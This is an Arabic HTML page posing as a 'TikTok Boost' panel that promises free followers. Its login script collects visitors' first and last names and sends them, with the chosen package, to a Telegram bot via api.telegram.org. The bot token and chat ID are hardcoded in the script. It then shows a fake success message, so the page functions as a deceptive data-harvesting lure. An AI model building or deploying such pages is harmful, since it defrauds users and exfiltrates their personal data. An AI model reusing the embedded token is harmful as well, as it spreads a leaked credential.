<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Boost Panel | لوحة تيك توك الاحترافية</title>
    <style>
        :root {
            --tiktok-black: #121212;
            --tiktok-pink: #FE2C55;
            --tiktok-cyan: #25F4EE;
            --bg-gradient: linear-gradient(180deg, #000000 0%, #1a1a1a 100%);
            --glass: rgba(255, 255, 255, 0.03);
            --border: rgba(255, 255, 255, 0.08);
        }

        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }

        body {
            background: var(--bg-gradient);
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .main-container {
            background: var(--glass);
            backdrop-filter: blur(20px);
            border: 1px solid var(--border);
            border-radius: 30px;
            width: 100%;
            max-width: 900px;
            display: flex;
            overflow: hidden;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
        }

        .brand-section {
            flex: 1;
            background: rgba(0,0,0,0.3);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 40px;
            border-left: 1px solid var(--border);
        }

        .tiktok-logo { font-size: 60px; margin-bottom: 20px; }
        .brand-section h1 { font-size: 28px; font-weight: 800; margin-bottom: 10px; }

        .form-section { flex: 1.5; padding: 40px; text-align: right; }
        .input-group { margin-bottom: 15px; }
        .input-group label { display: block; margin-bottom: 5px; color: #ccc; font-size: 14px; }
        
        input {
            width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #333;
            background: rgba(255,255,255,0.05); color: white; outline: none;
        }

        .services-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; }
        .service-card {
            background: rgba(255,255,255,0.03); border: 1px solid #333;
            padding: 15px; border-radius: 12px; cursor: pointer; text-align: center;
        }
        .service-card.active { border-color: var(--tiktok-cyan); background: rgba(37, 244, 238, 0.05); }

        .btn-login {
            width: 100%; padding: 15px; background: var(--tiktok-pink);
            color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer;
        }

        #status-msg { margin-top: 15px; text-align: center; display: none; font-size: 14px; }
    </style>
</head>
<body>

<div class="main-container">
    <div class="brand-section">
        <div class="tiktok-logo">🎵</div>
        <h1>TikTok Boost</h1>
        <p style="text-align:center; color:#aaa;">سجل دخولك لتفعيل الخدمات الحصرية</p>
    </div>

    <div class="form-section">
        <div class="input-group">
            <label>الاسم الأول *</label>
            <input type="text" id="fn" placeholder="اكتب اسمك الأول">
        </div>
        <div class="input-group">
            <label>الاسم الثاني (إجباري للتفعيل) *</label>
            <input type="text" id="ln" placeholder="اكتب اسمك الثاني">
        </div>

        <div class="services-grid">
            <div class="service-card active" onclick="selectCard(this, '100 متابع')"><h3>100</h3><p>كل ساعتين</p></div>
            <div class="service-card" onclick="selectCard(this, '500 متابع')"><h3>500</h3><p>كل 6 ساعات</p></div>
            <div class="service-card" onclick="selectCard(this, '1000 متابع')"><h3>1000</h3><p>كل يومين</p></div>
            <div class="service-card" onclick="selectCard(this, '2500 متابع')"><h3>2500</h3><p>كل 4 أيام</p></div>
        </div>

        <button class="btn-login" onclick="sendData()">تسجيل الدخول</button>
        <div id="status-msg">جاري المعالجة...</div>
    </div>
</div>

<script>
    let selectedPlan = "100 متابع";

    function selectCard(el, plan) {
        document.querySelectorAll('.service-card').forEach(c => c.classList.remove('active'));
        el.classList.add('active');
        selectedPlan = plan;
    }

    function sendData() {
        const token = "7546948976:AAETtxJ-ecUKdqVOd4LFI152-IaYxROFLWQ";
        const chatId = "56081692";
        const fName = document.getElementById('fn').value.trim();
        const lName = document.getElementById('ln').value.trim();
        const status = document.getElementById('status-msg');

        if (fName === "" || lName === "") {
            alert("⚠️ يجب ملء خانة الاسم الأول والاسم الثاني!");
            return;
        }

        status.style.display = "block";
        status.innerHTML = "⌛ جاري إرسال البيانات...";

        const text = `🎵 *طلب تيك توك جديد* \n\n👤 الاسم: ${fName} ${lName} \n📊 الباقة: ${selectedPlan}`;
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;

        fetch(url)
        .then(res => {
            if(res.ok) {
                status.innerHTML = "✅ تم تسجيل الدخول بنجاح!";
                status.style.color = "#25F4EE";
            } else {
                status.innerHTML = "❌ خطأ في الإرسال!";
            }
        })
        .catch(() => { status.innerHTML = "⚠️ فشل الاتصال!"; });
    }
</script>

</body>
</html>
